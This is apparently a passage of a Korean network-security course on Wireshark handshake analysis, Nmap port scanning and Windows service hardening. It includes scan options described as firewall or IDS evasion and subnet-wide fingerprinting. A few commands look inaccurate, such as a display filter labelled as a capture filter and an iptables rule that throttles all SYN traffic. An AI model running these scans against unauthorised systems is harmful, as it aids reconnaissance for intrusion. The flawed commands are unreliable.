A: **가독성** 향상입니다. 실제 시퀀스 번호는 매우 큰 랜덤 값(예: 1234567890)이라 분석이 어렵습니다. Wireshark는 각 연결의 첫 번째 패킷을 0으로 간주하여 **상대적 번호**로 변환합니다.

**Q4: 3-Way Handshake 과정에서 데이터 전송이 가능한가요?**

A: **TLS 1.3부터 가능합니다** (0-RTT). 기존 TCP와 TLS 1.2까지는 Handshake 완료 후에만 데이터 전송이 가능했으나, TLS 1.3은 첫 번째 패킷부터 데이터를 포함할 수 있습니다 (재연결 시).

**Q5: 포트 443은 무엇인가요?**

A: **HTTPS**(TLS를 사용하는 암호화된 HTTP)의 기본 포트입니다. 포트 80은 평문 HTTP에 사용되나, 보안상 최근에는 거의 모든 웹사이트가 HTTPS를 사용합니다.

---

## 🎯 실무 시나리오: 느린 웹사이트 접속 문제 분석

### 상황 설명

사용자가 특정 웹사이트에 접속할 때 **로딩 시간이 10초 이상** 걸린다고 불만을 제기했습니다. 네트워크 관리자로서 Wireshark를 사용하여 문제를 진단해야 합니다.

### 해결 과정

**1단계: 현황 파악**

Wireshark로 패킷 캡처 시작:
```bash
# 캡처 필터 (대상 웹사이트 IP)
ip.addr == 203.0.113.100
```

**예상 출력**:
```
No.  Time      Source          Destination     Protocol  Info
1    0.000000  192.168.1.50    203.0.113.100   TCP       [SYN] Seq=0
2    5.234567  203.0.113.100   192.168.1.50    TCP       [SYN, ACK] Seq=0 Ack=1
3    5.234890  192.168.1.50    203.0.113.100   TCP       [ACK] Seq=1 Ack=1
```

**분석**:
- SYN 패킷 전송: 0초
- SYN+ACK 수신: **5.23초 후** ⚠️
- ACK 전송: 즉시

**2단계: 문제 진단**

**발견된 문제**:
- SYN → SYN+ACK 응답 시간이 **5초 이상**
- 정상적인 경우 **50~200ms** 이내여야 함
- 3-Way Handshake 단계에서 이미 지연 발생

**가능한 원인**:
1. 서버 과부하 (연결 큐 가득 참)
2. 네트워크 경로 문제 (라우팅 지연)
3. 방화벽/IPS에서 SYN 패킷 검사에 시간 소요

**3단계: 추가 진단**

**ping 테스트**:
```bash
ping 203.0.113.100
```

**예상 결과**:
```
Reply from 203.0.113.100: time=45ms
Reply from 203.0.113.100: time=50ms
```
→ ping 응답은 정상 → 네트워크 경로 문제는 아님

**traceroute 테스트**:
```bash
tracert 203.0.113.100
```

**방화벽 로그 확인**:
```bash
# 방화벽에서 SYN 패킷 지연 확인
grep "SYN" /var/log/firewall.log
```

**4단계: 해결 방안 적용**

**원인 확정**: 서버의 **SYN Backlog Queue 부족**

**해결책**:
```bash
# 서버에서 SYN 백로그 증가
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# SYN Cookie 활성화
sudo sysctl -w net.ipv4.tcp_syncookies=1

# 설정 영구 적용
echo "net.ipv4.tcp_max_syn_backlog = 4096" | sudo tee -a /etc/sysctl.conf
echo "net.ipv4.tcp_syncookies = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

**5단계: 검증**

Wireshark로 재측정:
```
No.  Time      Source          Destination     Protocol  Info
1    0.000000  192.168.1.50    203.0.113.100   TCP       [SYN] Seq=0
2    0.082345  203.0.113.100   192.168.1.50    TCP       [SYN, ACK] Seq=0 Ack=1 ✅
3    0.082567  192.168.1.50    203.0.113.100   TCP       [ACK] Seq=1 Ack=1
```

**결과**: SYN → SYN+ACK 응답 시간이 **82ms**로 개선! ✅

### 배운 점

1. **3-Way Handshake 지연은 즉시 감지 가능**: Wireshark 타임스탬프 확인
2. **서버 설정이 성능에 직접 영향**: SYN Backlog 크기 중요
3. **계층별 진단 필요**: 네트워크(ping), 전송계층(Wireshark), 애플리케이션 모두 확인

---

다음 섹션에서는 **포트 스캐닝과 Nmap 사용법**을 학습합니다.
# Section 2: 포트 스캐닝과 Nmap 보안 도구

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- 포트 번호의 역할과 중요성
- 포트 스캐닝의 필요성 및 보안 관점
- Nmap 설치 및 기본 사용법
- 다양한 스캔 기법 (SYN Scan, Service Detection 등)
- Windows 서비스 관리 및 불필요한 포트 차단
- 실무에서의 포트 스캔 주기 및 모범 사례

---

## 📚 포트 번호(Port Number) 이해

### 포트 번호란?

**정의**:
포트 번호는 **하나의 호스트 내에서 실행 중인 여러 애플리케이션을 식별**하기 위해 사용되는 **16비트 숫자**(0~65535)입니다.

**왜 필요한가?**

한 컴퓨터에서는 여러 네트워크 서비스가 동시에 실행됩니다:
- 웹 서버 (HTTP/HTTPS)
- 메일 서버 (SMTP, IMAP)
- 데이터베이스 서버 (MySQL, PostgreSQL)
- 원격 접속 (SSH, RDP)
- 파일 공유 (FTP, SMB)

**IP 주소만으로는 어느 서비스와 통신하는지 구분할 수 없습니다.**

```mermaid
graph LR
    A[클라이언트<br/>192.168.1.100] -->|IP: 192.168.1.50<br/>Port: 80| B[웹 서버<br/>192.168.1.50:80]
    A -->|IP: 192.168.1.50<br/>Port: 22| C[SSH 서버<br/>192.168.1.50:22]
    A -->|IP: 192.168.1.50<br/>Port: 3306| D[MySQL 서버<br/>192.168.1.50:3306]
```

**비유**:
- IP 주소 = 아파트 주소
- 포트 번호 = 각 호수 (101호, 201호, 301호...)

---

### 포트 번호 범위와 분류

포트 번호는 **용도에 따라 세 가지 범위**로 나뉩니다:

| 범위 | 명칭 | 설명 | 예시 |
|:---:|:---:|:---:|:---:|
| **0 ~ 1023** | Well-Known Ports<br/>(시스템 포트) | **표준 서비스**에 할당<br/>관리자 권한 필요 | HTTP(80), HTTPS(443), SSH(22), FTP(21) |
| **1024 ~ 49151** | Registered Ports<br/>(등록된 포트) | **특정 애플리케이션**에 등록<br/>일반 사용자도 사용 가능 | MySQL(3306), PostgreSQL(5432), Redis(6379) |
| **49152 ~ 65535** | Dynamic/Private Ports<br/>(동적 포트) | **임시 포트** (Ephemeral Ports)<br/>클라이언트가 사용 | 54321, 60123, 63789 (랜덤) |

### 주요 Well-Known Ports 정리

#### 웹 서비스
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **80** | HTTP | 평문 웹 서비스 (암호화 X) |
| **443** | HTTPS | 암호화된 웹 서비스 (TLS/SSL) |
| **8080** | HTTP-Alt | 대체 HTTP 포트 (개발/테스트) |
| **8443** | HTTPS-Alt | 대체 HTTPS 포트 |

#### 원격 접속
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **22** | SSH | 안전한 원격 셸 (암호화) |
| **23** | Telnet | 원격 셸 (암호화 X, 사용 금지) |
| **3389** | RDP | Windows 원격 데스크톱 |
| **5900** | VNC | 가상 네트워크 컴퓨팅 (화면 공유) |

#### 파일 전송
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **21** | FTP | 파일 전송 (제어 채널, 암호화 X) |
| **20** | FTP-Data | FTP 데이터 채널 |
| **22** | SFTP | SSH 기반 안전한 파일 전송 |
| **445** | SMB | Windows 파일/프린터 공유 |

#### 메일 서비스
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **25** | SMTP | 메일 전송 |
| **110** | POP3 | 메일 수신 (다운로드 방식) |
| **143** | IMAP | 메일 수신 (서버 동기화) |
| **587** | SMTP (TLS) | 암호화된 메일 전송 |
| **993** | IMAP (TLS) | 암호화된 IMAP |
| **995** | POP3 (TLS) | 암호화된 POP3 |

#### 데이터베이스
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **3306** | MySQL/MariaDB | MySQL 데이터베이스 |
| **5432** | PostgreSQL | PostgreSQL 데이터베이스 |
| **1433** | MS SQL Server | Microsoft SQL Server |
| **1521** | Oracle | Oracle 데이터베이스 |
| **27017** | MongoDB | MongoDB NoSQL DB |
| **6379** | Redis | Redis 인메모리 DB |

#### DNS 및 네트워크
| 포트 | 프로토콜 | 설명 |
|:---:|:---:|:---:|
| **53** | DNS | 도메인 이름 조회 (UDP/TCP) |
| **67, 68** | DHCP | 동적 IP 할당 |
| **123** | NTP | 시간 동기화 |
| **161, 162** | SNMP | 네트워크 장비 모니터링 |

💡 **중요!** 이 포트들은 **공격자의 주요 타겟**입니다. 불필요한 포트는 반드시 닫아야 합니다.

---

## 🔍 포트 스캐닝(Port Scanning)이란?

### 정의

**포트 스캐닝**은 대상 호스트의 **열린 포트를 찾아내는 기술**입니다.

**목적**:
1. **보안 점검**: 의도하지 않게 열린 포트 발견
2. **서비스 인벤토리**: 실행 중인 서비스 파악
3. **취약점 발견**: 불필요한 서비스 제거
4. **컴플라이언스**: 보안 정책 준수 확인

### 포트 상태 분류

포트는 크게 **세 가지 상태**로 구분됩니다:

| 상태 | 설명 | TCP 응답 | 의미 |
|:---:|:---:|:---:|:---:|
| **Open** | 열림 | SYN → **SYN+ACK** | 서비스가 리스닝 중 ✅ |
| **Closed** | 닫힘 | SYN → **RST+ACK** | 포트는 접근 가능하나 서비스 없음 |
| **Filtered** | 필터링됨 | SYN → **(응답 없음)** | 방화벽에서 차단 🛡️ |

**시각화**:

```mermaid
sequenceDiagram
    participant Scanner as 스캐너
    participant Target as 대상 호스트

    Note over Scanner,Target: 상태 1: Open (열림)
    Scanner->>Target: SYN
    Target->>Scanner: SYN+ACK ✅
    Note over Scanner: 포트 열림!

    Note over Scanner,Target: 상태 2: Closed (닫힘)
    Scanner->>Target: SYN
    Target->>Scanner: RST+ACK ❌
    Note over Scanner: 포트 닫힘

    Note over Scanner,Target: 상태 3: Filtered (필터링)
    Scanner->>Target: SYN
    Note over Target: 방화벽 차단
    Note over Scanner: 응답 없음 🛡️
```

---

### 기업에서의 포트 스캔 실무

💼 **강사님의 실무 경험**:

> "제가 예전에 다녔던 회사에서는 **1년에 두 번**, 공식적으로 포트 스캔을 돌렸습니다. 나중에는 보안 담당자가 늘어나면서 **분기 단위**(3개월마다)로 포트 스캔을 돌렸습니다."

**왜 주기적으로 스캔하는가?**

운영 중에는 다음과 같은 상황이 자주 발생합니다:
- "잠깐만 이 포트 열어주세요" → 테스트 후 닫는 것을 **깜빡**
- 긴급 패치/배포 중 임시 포트 오픈 → 사후 **미조치**
- 개발자가 로컬 테스트용 서비스를 프로덕션 서버에 그대로 둠

**스캔 방식**:
1. **내부 스캔**: 내부 네트워크에서 각 서버 스캔
2. **외부 스캔**: 외부 인터넷에서 공인 IP 스캔 (DMZ 구간)
3. **정기 보고서**: 발견된 이슈를 리포트하여 운영팀에 전달

**발견 시 조치**:
```
이상 포트 발견 → 담당자 확인 → 필요 여부 판단
  ├─ 필요 없음 → 서비스 중지 + 방화벽 차단
  └─ 필요함 → 예외 승인 문서화 + 주기 재확인
```

⚠️ **주의**: 포트 스캔은 **내부 보안 점검 목적**으로만 수행해야 하며, 외부 시스템에 무단으로 스캔하는 것은 **불법**입니다.

---

## 🛠️ Nmap 소개 및 설치

### Nmap이란?

**Nmap** (Network Mapper)는 **세계에서 가장 유명한 오픈소스 포트 스캐닝 도구**입니다.

**개발자**: Gordon Lyon (Fyodor)
**라이선스**: GPL (무료 오픈소스)
**공식 사이트**: https://nmap.org

**주요 기능**:
1. **포트 스캔**: TCP/UDP 포트 열림 여부 확인
2. **서비스 탐지**: 실행 중인 서비스 이름 및 버전 파악
3. **OS 탐지**: 대상 시스템의 운영체제 추정
4. **스크립트 엔진(NSE)**: 600+ 스크립트로 취약점 진단
5. **네트워크 매핑**: 네트워크 토폴로지 파악

**지원 플랫폼**:
- Windows
- Linux
- macOS
- BSD

---

### Nmap 설치 (Windows)

#### Step 1: 다운로드

1. 공식 사이트 접속: https://nmap.org/download.html
2. **Windows** 섹션 클릭
3. **Latest stable release** 다운로드
   - 예: `nmap-7.95-setup.exe` (버전은 변경될 수 있음)

```
┌──────────────────────────────────────────────┐
│ Nmap Download Page                           │
├──────────────────────────────────────────────┤
│ Platform: Microsoft Windows                  │
│                                              │
│ Latest stable release:                       │
│ ▶ nmap-7.95-setup.exe                       │
│   (SHA-256: abc123...)                       │
│                                              │
│ Self-installer with Zenmap GUI              │
└──────────────────────────────────────────────┘
```

#### Step 2: 설치

1. 다운로드한 `.exe` 파일 더블클릭
2. **사용자 계정 컨트롤(UAC)** 허용
3. 설치 마법사 진행:
   - License Agreement: **I Agree**
   - Components 선택:
     - ✅ Nmap Core Files (필수)
     - ✅ Zenmap (GUI, 권장)
     - ✅ Npcap (패킷 캡처 라이브러리, 필수)
   - Install Location: 기본값 (`C:\Program Files (x86)\Nmap`)
4. **Install** 버튼 클릭
5. 설치 완료 후 **Finish**

⚠️ **주의**: **Npcap** 설치가 중요합니다. 이것이 없으면 Nmap이 제대로 동작하지 않습니다.

#### Step 3: 설치 확인

**명령 프롬프트 (cmd)** 또는 **PowerShell**에서:

```bash
nmap --version
```

**예상 출력**:
```
Nmap version 7.95 ( https://nmap.org )
Platform: i686-pc-windows-windows
Compiled with: nmap-liblua-5.4.6 openssl-3.0.13 nmap-libssh2-1.11.0
              nmap-libz-1.3 nmap-libpcre-8.45 nmap-libpcap-1.10.4
              nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: iocp poll select
```

✅ 버전 정보가 정상 출력되면 설치 성공!

---

### Zenmap (Nmap GUI) 실행

**Zenmap**은 Nmap의 **그래픽 사용자 인터페이스(GUI)**입니다.

#### Zenmap 실행 방법

1. **시작 메뉴** → **Zenmap** 검색
2. 또는 바탕화면 아이콘 더블클릭
3. **관리자 권한으로 실행** (권장)

#### Zenmap 인터페이스 구성

```
┌─────────────────────────────────────────────────────────┐
│ Zenmap - Nmap GUI                                   [×] │
├─────────────────────────────────────────────────────────┤
│ Target: [127.0.0.1                      ]               │
│ Profile: [Intense scan                  ▼]              │
│ Command: nmap -T4 -A -v 127.0.0.1                       │
│ ┌─────┐ ┌──────┐ ┌──────┐                              │
│ │Scan │ │Cancel│ │Save  │                              │
│ └─────┘ └──────┘ └──────┘                              │
├─────────────────────────────────────────────────────────┤
│ [Nmap Output] [Ports / Hosts] [Topology] [Scans]       │
├─────────────────────────────────────────────────────────┤
│ Starting Nmap 7.95...                                   │
│ Nmap scan report for localhost (127.0.0.1)             │
│ Host is up (0.00050s latency).                          │
│ Not shown: 996 closed ports                             │
│ PORT     STATE SERVICE     VERSION                      │
│ 80/tcp   open  http        Apache httpd 2.4.52          │
│ 443/tcp  open  ssl/http    Apache httpd 2.4.52          │
│ 3306/tcp open  mysql       MySQL 8.0.32                 │
│ ...                                                      │
└─────────────────────────────────────────────────────────┘
```

**주요 구성 요소**:
1. **Target**: 스캔 대상 IP 또는 호스트명
2. **Profile**: 미리 정의된 스캔 프로파일
3. **Command**: 실제 실행될 Nmap 명령어
4. **Output**: 스캔 결과 출력

---

## 📟 Nmap 기본 사용법

### 기본 문법

```bash
nmap [옵션] [대상]
```

**대상 지정 방법**:
- 단일 IP: `192.168.1.100`
- 도메인: `example.com`
- IP 범위: `192.168.1.1-254`
- 서브넷: `192.168.1.0/24`
- 여러 대상: `192.168.1.1 192.168.1.2`

---

### 실습 1: 로컬호스트 기본 스캔

#### 명령어

```bash
nmap 127.0.0.1
```

또는

```bash
nmap localhost
```

#### 예상 출력

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 09:30 KST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
```

#### 출력 해석

**Host is up**:
- 대상 호스트가 **활성 상태**임
- 응답 시간: 0.0001초 (매우 빠름, 로컬이므로)

**Not shown: 997 closed tcp ports**:
- 전체 65,535개 포트 중 997개는 닫혀 있음
- Nmap은 기본적으로 **가장 많이 사용되는 1,000개 포트**만 스캔

**PORT / STATE / SERVICE**:
- `80/tcp open http`: HTTP 웹 서버 실행 중
- `135/tcp open msrpc`: Windows RPC 서비스
- `445/tcp open microsoft-ds`: Windows 파일 공유 (SMB)

---

### 실습 2: IIS 웹 서버 활성화 및 재스캔

강의에서는 **Windows IIS (Internet Information Services)**를 활성화하여 포트 80이 열리는 것을 확인합니다.

#### Step 1: Windows 기능에서 IIS 활성화

**방법 1: GUI 사용**

1. **Win + R** → `optionalfeatures.exe` 입력 → Enter
2. **Windows 기능 켜기/끄기** 창 열림
3. 아래로 스크롤하여 **"인터넷 정보 서비스"** 찾기
4. 체크박스 선택 (파란색으로 변함)
5. **"World Wide Web 서비스"** 하위 항목도 선택
6. **확인** 버튼 클릭
7. Windows가 필요한 파일 설치 (시간 소요)
8. 완료 후 **닫기**

**방법 2: PowerShell 사용 (관리자 권한)**

```powershell
# IIS 기능 설치
Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole

# 추가 기능 설치 (선택사항)
Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServer
Enable-WindowsOptionalFeature -Online -FeatureName IIS-CommonHttpFeatures
```

#### Step 2: IIS 서비스 시작 확인

**서비스 관리자 (services.msc)**에서:

1. **Win + R** → `services.msc` → Enter
2. **"World Wide Web Publishing Service"** 찾기
3. 상태가 **"실행 중"**인지 확인
4. 시작 유형이 **"자동"**인지 확인

또는 **PowerShell**에서:

```powershell
# IIS 서비스 상태 확인
Get-Service -Name W3SVC

# 서비스 시작 (만약 중지되어 있다면)
Start-Service -Name W3SVC
```

#### Step 3: 웹 브라우저로 확인

브라우저 주소창에:

```
http://localhost
```

또는

```
http://127.0.0.1
```

**예상 화면**:

```
┌─────────────────────────────────────────┐
│        IIS Windows Server               │
├─────────────────────────────────────────┤
│                                         │
│          [IIS 로고]                     │
│                                         │
│   Welcome to IIS!                       │
│                                         │
│   This is the default web page for      │
│   this server.                          │
│                                         │
└─────────────────────────────────────────┘
```

✅ 이 페이지가 뜨면 IIS 정상 작동!

#### Step 4: Nmap 재스캔

```bash
nmap 127.0.0.1
```

**예상 출력** (이전과 비교):

```
PORT     STATE SERVICE
80/tcp   open  http        ← 새로 추가됨! ✅
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
```

📌 **노트**: 포트 80이 **새로 열린 것을 확인**할 수 있습니다. 이것이 바로 포트 스캔의 목적입니다!

---

## 🔧 Nmap 주요 옵션 상세 분석

### 스캔 기법 옵션 (-s)

Nmap은 다양한 스캔 기법을 지원합니다. 각각의 장단점이 있습니다.

#### 1. TCP SYN Scan (-sS)

**명령어**:
```bash
nmap -sS 192.168.1.100
```

**동작 원리**:
- **Half-Open Scan**이라고도 함
- TCP 3-Way Handshake를 **완료하지 않음**

```mermaid
sequenceDiagram
    participant Nmap as Nmap
    participant Target as 대상 포트

    Nmap->>Target: SYN
    alt 포트 열림
        Target->>Nmap: SYN+ACK
        Nmap->>Target: RST (연결 중단!)
    else 포트 닫힘
        Target->>Nmap: RST+ACK
    end
```

**특징**:
- **빠름**: 완전 연결을 수립하지 않으므로 속도가 빠름
- **은밀함**: 일부 로깅 시스템은 완전 연결만 기록 (하지만 현대 IDS는 탐지 가능)
- **정확함**: 포트 상태를 정확히 판별
- **관리자 권한 필요**: Raw 소켓 사용

💡 **중요!** SYN Scan은 Nmap의 **기본 스캔 방식**입니다 (관리자 권한이 있을 때).

#### 2. TCP Connect Scan (-sT)

**명령어**:
```bash
nmap -sT 192.168.1.100
```

**동작 원리**:
- **Full-Open Scan**
- TCP 3-Way Handshake를 **완전히 수행**
- 시스템의 `connect()` 시스템 콜 사용

**특징**:
- **일반 사용자 권한**으로 실행 가능
- **느림**: 완전 연결 수립 후 종료 과정 필요
- **탐지 용이**: 로그에 명확히 기록됨
- **정확함**: 포트 상태를 정확히 판별

**사용 시나리오**:
- 관리자 권한이 없을 때
- 정식 승인된 보안 점검

#### 3. UDP Scan (-sU)

**명령어**:
```bash
nmap -sU 192.168.1.100
```

**동작 원리**:
- UDP는 **비연결형 프로토콜**이므로 응답이 불확실
- UDP 패킷 전송 후 응답 대기
  - 응답 있음 → 포트 열림
  - ICMP "Port Unreachable" → 포트 닫힘
  - 응답 없음 → 열림 또는 필터링 (불확실)

**특징**:
- **매우 느림**: 응답 대기 시간 길음
- **불확실**: 방화벽에서 ICMP 차단 시 판별 어려움
- **중요함**: DNS(53), SNMP(161), DHCP(67) 등 중요 서비스는 UDP

**추천 사용법**:
```bash
# UDP 스캔 + 특정 포트만
nmap -sU -p 53,67,161 192.168.1.100
```

#### 4. Xmas Scan (-sX)

**명령어**:
```bash
nmap -sX 192.168.1.100
```

**동작 원리**:
- TCP 패킷에 **FIN, PSH, URG 플래그**를 모두 설정하여 전송
- 이름 유래: 크리스마스 트리처럼 플래그가 켜져 있음 🎄

**특징**:
- **방화벽 우회 시도**: 일부 구형 방화벽은 SYN 패킷만 필터링
- **은밀함**: 비정상 패킷이라 로그에 기록 안 될 수 있음 (과거)
- **현대에는 비효율**: 최신 IDS/IPS는 즉시 탐지

⚠️ **주의**: 실무에서는 거의 사용하지 않으며, 공격으로 간주될 수 있음

---

### 서비스 및 버전 탐지 옵션

#### -sV (Service Version Detection)

**명령어**:
```bash
nmap -sV 192.168.1.100
```

**동작 원리**:
- 열린 포트에 **실제 연결**하여 배너 그래빙 (Banner Grabbing)
- 응답 메시지를 분석하여 서비스 이름 및 버전 추정

**실행 예제**:

```bash
nmap -sV 127.0.0.1
```

**예상 출력**:

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds  Microsoft Windows Server 2019 microsoft-ds
3306/tcp open  mysql         MySQL 8.0.32-0ubuntu0.22.04.2
```

**출력 해석**:
- `http Microsoft IIS httpd 10.0`: IIS 버전 10.0
- `mysql MySQL 8.0.32`: MySQL 버전 8.0.32

💡 **중요!** 버전 정보는 **취약점 분석**에 매우 유용합니다. 특정 버전에만 존재하는 보안 취약점을 CVE 데이터베이스에서 검색할 수 있습니다.

#### -A (Aggressive Scan)

**명령어**:
```bash
nmap -A 192.168.1.100
```

**포함 기능**:
- `-sV`: 서비스 버전 탐지
- `-O`: OS 탐지
- `--script=default`: 기본 NSE 스크립트 실행
- `--traceroute`: 경로 추적

**특징**:
- **가장 상세한 정보** 제공
- **시간 소요**: 여러 기능을 동시 수행
- **탐지 위험**: 공격적인 스캔으로 간주됨

**실행 예제**:

```bash
nmap -A 127.0.0.1
```

**예상 출력** (일부):

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds  Microsoft Windows Server 2019
3306/tcp open  mysql         MySQL 8.0.32
| mysql-info:
|   Protocol: 10
|   Version: 8.0.32-0ubuntu0.22.04.2
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsTransactions
|_  Salt: [random salt value]

Device type: general purpose
Running: Microsoft Windows 10|2016|2019
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows 10 1709 - 1909, or Windows Server 2016 - 2019
Network Distance: 0 hops
```

**상세 정보**:
- HTTP 서버 헤더
- MySQL 프로토콜 버전 및 기능
- OS 추정: Windows 10 또는 Server 2019

---

### 포트 지정 옵션 (-p)

#### 기본 동작 (옵션 없음)

```bash
nmap 192.168.1.100
```
- **1,000개의 가장 많이 사용되는 포트**만 스캔

#### 전체 포트 스캔

```bash
nmap -p- 192.168.1.100
```
- **모든 65,535개 포트** 스캔
- 시간 소요: 매우 김 (수 분~수십 분)

#### 특정 포트만 스캔

```bash
# 단일 포트
nmap -p 80 192.168.1.100

# 여러 포트 (쉼표로 구분)
nmap -p 80,443,3306 192.168.1.100

# 포트 범위 (하이픈)
nmap -p 1-1024 192.168.1.100

# 조합
nmap -p 80,443,1000-2000 192.168.1.100
```

#### 프로토콜별 포트 지정

```bash
# TCP 포트만
nmap -p T:80,443 192.168.1.100

# UDP 포트만
nmap -p U:53,161 192.168.1.100

# TCP와 UDP 동시
nmap -p T:80,443,U:53 192.168.1.100
```

---

### 타이밍 옵션 (-T)

Nmap은 **스캔 속도를 조절**하여 탐지를 회피하거나 빠르게 스캔할 수 있습니다.

**타이밍 템플릿**:

| 템플릿 | 이름 | 속도 | 용도 |
|:---:|:---:|:---:|:---:|
| **-T0** | Paranoid | 극도로 느림 | IDS 회피 (실무에서 거의 안 씀) |
| **-T1** | Sneaky | 매우 느림 | 은밀한 스캔 |
| **-T2** | Polite | 느림 | 대역폭 절약 |
| **-T3** | Normal | 보통 | **기본값** |
| **-T4** | Aggressive | 빠름 | **빠른 스캔 (권장)** |
| **-T5** | Insane | 매우 빠름 | 속도 최우선 (정확도 ↓) |

**실행 예제**:

```bash
# 빠른 스캔 (권장)
nmap -T4 192.168.1.100

# 매우 빠른 스캔 (결과 손실 가능)
nmap -T5 192.168.1.100
```

💡 **중요!** 일반적으로 **-T3 (기본)** 또는 **-T4 (빠름)**을 사용합니다. `-T5`는 패킷 손실이 발생할 수 있어 정확도가 떨어집니다.

---

### 출력 형식 옵션

#### 일반 출력 (-oN)

```bash
nmap -oN scan_result.txt 192.168.1.100
```
- 터미널에 출력되는 형식 그대로 파일에 저장

#### Grepable 출력 (-oG)

```bash
nmap -oG scan_result.gnmap 192.168.1.100
```
- `grep` 명령어로 파싱하기 쉬운 형식

#### XML 출력 (-oX)

```bash
nmap -oX scan_result.xml 192.168.1.100
```
- XML 형식, 다른 도구와 연동

#### 모든 형식 동시 저장 (-oA)

```bash
nmap -oA scan_result 192.168.1.100
```
- 세 가지 형식 모두 저장:
  - `scan_result.nmap` (일반)
  - `scan_result.gnmap` (Grepable)
  - `scan_result.xml` (XML)

---

## 📟 Nmap 실전 명령어 예제

### 예제 1: 기본 보안 점검 스캔

```bash
nmap -sS -sV -T4 -p 1-65535 192.168.1.100
```

**설명**:
- `-sS`: TCP SYN 스캔 (빠르고 정확)
- `-sV`: 서비스 버전 탐지
- `-T4`: 빠른 타이밍
- `-p 1-65535`: 모든 포트 스캔

**예상 소요 시간**: 5~10분

---

### 예제 2: 웹 서버 전용 스캔

```bash
nmap -p 80,443,8080,8443 -sV --script=http-* 192.168.1.100
```

**설명**:
- `-p 80,443,8080,8443`: 웹 서비스 포트만
- `--script=http-*`: HTTP 관련 NSE 스크립트 실행
  - http-title: 웹 페이지 제목
  - http-headers: HTTP 헤더 정보
  - http-methods: 지원하는 HTTP 메서드
  - http-sql-injection: SQL 인젝션 취약점 테스트 (일부)

**예상 출력**:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Welcome to My Website
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  open  ssl/http Apache httpd 2.4.52
| ssl-cert: Subject: commonName=example.com
| Issuer: commonName=Let's Encrypt Authority X3
|_Not valid after:  2026-01-15T00:00:00
```

---

### 예제 3: 특정 서비스만 찾기 (MySQL)

```bash
nmap -p 3306 --open -sV 192.168.1.0/24
```

**설명**:
- `-p 3306`: MySQL 포트만
- `--open`: 열린 포트만 표시
- `192.168.1.0/24`: 서브넷 전체 스캔 (1~254)

**용도**: 네트워크 내 모든 MySQL 서버 인벤토리

---

### 예제 4: OS 탐지 스캔

```bash
nmap -O 192.168.1.100
```

**동작 원리**:
- TCP/IP 스택의 **미묘한 차이**를 분석
- 각 OS는 고유한 응답 패턴 존재

**예상 출력**:

```
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.4 - 5.10
Network Distance: 1 hop
```

⚠️ **주의**: OS 탐지는 **100% 정확하지 않으며**, 최신 OS일수록 정확도가 낮을 수 있습니다.

---

## 🛡️ Windows 서비스 관리

### 서비스 중지 방법

포트 스캔에서 불필요한 포트가 발견되면 **해당 서비스를 중지**해야 합니다.

#### 방법 1: 서비스 관리 도구 (GUI)

1. **Win + R** → `services.msc` → Enter
2. 서비스 목록에서 대상 서비스 찾기
   - 예: **World Wide Web Publishing Service** (IIS)
3. 서비스 더블클릭
4. **중지** 버튼 클릭
5. **시작 유형**을 **"사용 안 함"**으로 변경
6. **적용** → **확인**

#### 방법 2: PowerShell (관리자 권한)

```powershell
# 서비스 중지
Stop-Service -Name W3SVC -Force

# 서비스 비활성화 (재부팅 후에도 시작 안 함)
Set-Service -Name W3SVC -StartupType Disabled

# 확인
Get-Service -Name W3SVC
```

**예상 출력**:

```
Status   Name               DisplayName
------   ----               -----------
Stopped  W3SVC              World Wide Web Publishing Serv...
```

#### 방법 3: 명령 프롬프트

```cmd
# 서비스 중지
net stop "World Wide Web Publishing Service"

# 서비스 비활성화
sc config W3SVC start= disabled
```

---

### 서비스 재시작 방법

테스트 후 서비스를 다시 시작하려면:

**PowerShell**:
```powershell
# 서비스 활성화
Set-Service -Name W3SVC -StartupType Automatic

# 서비스 시작
Start-Service -Name W3SVC

# 확인
Get-Service -Name W3SVC
```

---

## 🔐 보안 고려사항

### 포트 스캔 탐지 및 대응

#### 1. 포트 스캔 탐지 방법

**로그 분석**:
```bash
# Linux: 방화벽 로그에서 SYN 패킷 확인
sudo grep "SYN" /var/log/syslog | grep -v ESTABLISHED
```

**IDS 알림**:
- Suricata, Snort 등 IDS는 포트 스캔 패턴 자동 탐지
- 예: "Nmap SYN Scan Detected"

**특징**:
- 짧은 시간 내 **여러 포트로 연결 시도**
- 대부분의 연결이 **즉시 종료** (RST)

#### 2. 대응 방안

**방안 1: 방화벽 규칙 추가**

```bash
# Linux iptables: 포트 스캔 IP 차단
sudo iptables -A INPUT -p tcp --tcp-flags ALL SYN -m limit --limit 1/s -j ACCEPT
sudo iptables -A INPUT -p tcp --tcp-flags ALL SYN -j DROP
```

